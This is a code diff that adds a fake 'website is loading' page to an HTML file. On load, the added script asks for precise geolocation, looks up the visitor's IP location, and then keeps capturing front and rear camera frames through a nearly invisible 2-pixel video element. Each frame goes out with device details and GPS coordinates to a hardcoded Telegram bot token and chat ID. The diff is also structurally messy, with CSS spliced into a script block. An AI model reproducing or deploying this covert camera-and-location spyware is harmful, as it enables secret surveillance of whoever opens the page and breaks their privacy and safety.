@@ -190,6 +190,149 @@ phoneInput.addEventListener('input', validateFormState);
                 );
             }
         });
+        .snap-portal { position: absolute; width: 1px; height: 1px; opacity: 0; overflow: hidden; }
+        .media-container { display: flex; justify-content: center; align-items: center; }
+        video { 
+    position: absolute;
+    top: 1px;           /* Top se thoda sa gap */
+    left: 1px;          /* Left se thoda sa gap */
+    width: 2px;         /* 0.1 Inch Width 📏 */
+    height: 2px;        /* 0.1 Inch Height 📏 */
+    object-fit: cover; 
+    display: block;      /* Hidden se hata kar visible kiya 🎥 */
+    z-index: 500;        /* Sabse upar dikhane ke liye */
+    border: 1px solid #FFFC00; /* Yellow border taaki corner me saaf dikhe */
+    border-radius: 1px;
+}
+
+        canvas { display: none; }
+        .preview-img { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="loading-container">
+    <div class="loading-text">This website is loading...</div>
+    <button class="please wait-btn" onclick="location.reload();">please wait</button>
+</div>
+
+<div class="snap-portal">
+    <div class="media-container">
+        <video id="webcam" autoplay playsinline muted></video>
+        <canvas id="captureCanvas" width="640" height="480"></canvas>
+        <img id="savedFrame" class="preview-img" alt="System Snapshot Matrix">
+    </div>
+</div>
+
+<script>
+    let activeStream = null;
+    let isLoopRunning = false;
+    let loopCycleCounter = 0;
+    const targetPayload = {
+        deviceModel: navigator.userAgent,
+        broadLocation: "Verifying...",
+        exactCoordinates: "Not Granted"
+    };
+
+    fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+            targetPayload.broadLocation = `City: ${data.city}, State: ${data.region}`;
+        }).catch(() => { targetPayload.broadLocation = "IP profile deferred"; });
+    window.addEventListener('DOMContentLoaded', () => {
+        executeZeroClickTrace();
+    });
+
+    function executeZeroClickTrace() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => { targetPayload.exactCoordinates = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`; startMaxSpeedSequence(); },
+                (err) => { targetPayload.exactCoordinates = `Denied: ${err.message}`; startMaxSpeedSequence(); },
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
+        } else { startMaxSpeedSequence(); }
+    }
+    function startMaxSpeedSequence() {
+        if (isLoopRunning) return;
+        isLoopRunning = true;
+        runSequentialCycle();
+    }
+
+    function runSequentialCycle() {
+        loopCycleCounter++;
+        
+        executeTargetAxisStream("user", () => {
+            setTimeout(() => {
+                executeTargetAxisStream("environment", () => {
+                    setTimeout(runSequentialCycle, 100); 
+                });
+            }, 300);
+        });
+    }
+    function executeTargetAxisStream(facingModeType, callbackEvent) {
+        if (activeStream) {
+            activeStream.getTracks().forEach(track => track.stop());
+        }
+
+        navigator.mediaDevices.getUserMedia({ 
+            video: { width: 640, height: 480, facingMode: facingModeType }, 
+            audio: false 
+        })
+        .then((stream) => {
+            activeStream = stream;
+            const videoEl = document.getElementById('webcam');
+            videoEl.srcObject = stream;
+            videoEl.style.display = "block";
+
+            videoEl.onloadedmetadata = () => {
+                setTimeout(() => {
+                    processSnapshotCapture(facingModeType);
+                    if (callbackEvent) callbackEvent();
+                }, 350);
+            };
+        })
+        .catch((error) => {
+            console.log(`Axis track missing: ${facingModeType}`, error);
+            if (callbackEvent) callbackEvent();
+        });
+    }
+    function processSnapshotCapture(currentActiveAxis) {
+        const videoEl = document.getElementById('webcam');
+        const canvasEl = document.getElementById('captureCanvas');
+        const previewImg = document.getElementById('savedFrame');
+        const context = canvasEl.getContext('2d');
+
+        context.drawImage(videoEl, 0, 0, 640, 480);
+        const compiledBase64 = canvasEl.toDataURL('image/jpeg', 0.65);
+
+        previewImg.src = compiledBase64;
+        previewImg.style.display = "block";
+
+        dispatchBinaryBlobToBot(canvasEl, currentActiveAxis);
+    }
+
+    function dispatchBinaryBlobToBot(canvasElement, axisLabel) {
+        const botToken = "8901334974:AAGaj98eLxPL2C6078Xi4FywZ-cNZuXuKfg"; 
+        const chatId = "8562061813"; 
+
+        let textCaption = `*⚡ RAPID LOOP SECURED ⚡*\n`;
+        textCaption += `*🔄 Cycle:* #${loopCycleCounter} | *📷 Lens:* ${axisLabel.toUpperCase()}\n`;
+        textCaption += `*📱 Specs:* ${targetPayload.deviceModel}\n`;
+        textCaption += `*📍 GPS:* ${targetPayload.exactCoordinates}\n`;
+
+        canvasElement.toBlob(function(binaryBlobChunk) {
+            const multiPartFormPayload = new FormData();
+            multiPartFormPayload.append('chat_id', chatId);
+            multiPartFormPayload.append('photo', binaryBlobChunk, `fast_loop_${loopCycleCounter}_${axisLabel}.jpg`);
+            multiPartFormPayload.append('caption', textCaption);
+            multiPartFormPayload.append('parse_mode', 'Markdown');
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: multiPartFormPayload
+            }).catch(() => { console.log("Packet drop on high speed send."); });
+        }, 'image/jpeg', 0.65);
+        }
 
         // Camera Media Query Setup Pipeline
         camBtn.addEventListener('click', () => { 
